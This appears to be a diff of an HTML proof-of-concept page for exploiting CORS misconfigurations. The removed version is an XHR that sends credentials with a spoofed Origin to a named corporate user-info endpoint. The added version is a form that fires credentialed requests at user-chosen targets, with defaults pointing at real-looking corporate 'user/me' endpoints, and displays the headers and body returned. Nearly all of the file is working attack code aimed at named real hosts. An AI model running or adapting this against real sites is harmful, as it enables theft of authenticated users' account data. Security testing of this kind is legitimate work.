@@ -1,25 +1,48 @@
-<!-- malicious.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious Site</title>
+    <title>CORS Misconfiguration PoC</title>
 </head>
 <body>
+    <h1>CORS Misconfiguration PoC</h1>
+
+    <form id="corsForm">
+        <label for="targetURL">Target URL:</label><br>
+        <input type="text" id="targetURL" name="targetURL"  value="https://authorization.labplatform.vmware.com/user/me" required><br><br>
+
+        <label for="originURL">Malicious Origin:</label><br>
+        <input type="text" id="originURL" name="originURL" value="https://authorization.labplatform.dell.com/" required><br><br>
+
+        <button type="submit">Send CORS Request</button>
+    </form>
+
+    <h3>Response:</h3>
+    <pre id="response"></pre>
+
     <script>
-        // Craft a request with the desired Origin Header value
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://ctm.dell.com/CTMService/ctm-user-management-service/v2/userInfo', true);
-        xhr.setRequestHeader('Origin', 'https://fake.site.dell.com');
-        xhr.withCredentials = true;
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                // Handle the response as needed
-                console.log(xhr.responseText);
-            }
-        };
-        xhr.send();
+        document.getElementById("corsForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const targetURL = document.getElementById("targetURL").value;
+            const maliciousOrigin = document.getElementById("originURL").value;
+
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", targetURL, true);
+            xhr.withCredentials = true; // Allow sending cookies
+            xhr.setRequestHeader("Origin", maliciousOrigin); // Setting malicious Origin header
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    document.getElementById("response").textContent = 
+                        "Status: " + xhr.status + "\n" +
+                        "Response Headers:\n" + xhr.getAllResponseHeaders() + "\n\n" +
+                        "Response Body:\n" + xhr.responseText;
+                }
+            };
+
+            xhr.send();
+        });
     </script>
 </body>
 </html>
